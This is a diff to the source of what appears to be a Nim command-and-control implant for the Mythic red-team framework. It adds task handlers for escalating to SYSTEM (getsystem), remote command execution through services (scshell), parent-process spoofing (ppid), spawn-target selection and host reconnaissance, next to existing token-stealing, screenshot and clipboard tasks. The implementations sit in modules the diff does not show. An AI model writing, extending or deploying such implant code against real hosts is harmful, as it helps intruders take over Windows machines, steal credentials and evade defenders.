@@ -1,5 +1,6 @@
 import std/[json, random, os, base64, tables, times, strutils, strformat]
 import config
+import global_data
 import profiles/http_profile
 import utils/sysinfo
 import tasks/exit
@@ -32,6 +33,17 @@ when defined(windows):
   import tasks/make_token
   import tasks/steal_token
   import tasks/rev2self
+  import tasks/getsystem
+  import tasks/getprivs
+  import tasks/getenv
+  import tasks/listpipes
+  import tasks/ifconfig
+  import tasks/netstat
+  import tasks/scshell
+  import tasks/config
+  import tasks/spawnto_x64
+  import tasks/spawnto_x86
+  import tasks/ppid
   import tasks/screenshot
   import tasks/get_av
   import tasks/clipboard
@@ -75,6 +87,8 @@ proc newAgent*(): Agent =
   result = Agent()
   result.activeMonitoringTasks = initTable[string, MonitoringTaskType]()
   result.config = getConfig()
+  # Initialize global data storage
+  initGlobalData()
   result.profile = newHttpProfile()
   result.callbackUuid = result.config.uuid  # Initialize with payload UUID
   result.shouldExit = false
@@ -547,6 +561,97 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
             "status": "error",
             "user_output": "rev2self command is only available on Windows"
           }
+      
+      of "getsystem":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing getsystem command"
+          response = getsystem(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "getsystem command is only available on Windows"
+          }
+      
+      of "getprivs":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing getprivs command"
+          response = getprivs(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "getprivs command is only available on Windows"
+          }
+      
+      of "getenv":
+        if agent.config.debug:
+          echo "[DEBUG] Executing getenv command"
+        response = getenv(taskId, params)
+      
+      of "listpipes":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing listpipes command"
+          response = listpipes(taskId, params)
+        else:
+          response = %*{
+            "task_id": taskId,
+            "completed": true,
+            "status": "error",
+            "user_output": "listpipes command is only available on Windows"
+          }
+      
+      of "ifconfig":
+        if agent.config.debug:
+          echo "[DEBUG] Executing ifconfig command"
+        response = ifconfig(taskId, params)
+      
+      of "netstat":
+        if agent.config.debug:
+          echo "[DEBUG] Executing netstat command"
+        response = netstat(taskId, params)
+      
+      of "scshell":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing scshell command"
+          response = scshell(taskId, params)
+        else:
+          response = mythicError(taskId, "scshell is only available on Windows")
+      
+      of "config":
+        if agent.config.debug:
+          echo "[DEBUG] Executing config command"
+        response = config(taskId, params)
+      
+      of "spawnto_x64":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing spawnto_x64 command"
+          response = spawnto_x64(taskId, params)
+        else:
+          response = mythicError(taskId, "spawnto_x64 is only available on Windows")
+      
+      of "spawnto_x86":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing spawnto_x86 command"
+          response = spawnto_x86(taskId, params)
+        else:
+          response = mythicError(taskId, "spawnto_x86 is only available on Windows")
+      
+      of "ppid":
+        when defined(windows):
+          if agent.config.debug:
+            echo "[DEBUG] Executing ppid command"
+          response = ppid(taskId, params)
+        else:
+          response = mythicError(taskId, "ppid is only available on Windows")
       
       of "get_av":
         when defined(windows):
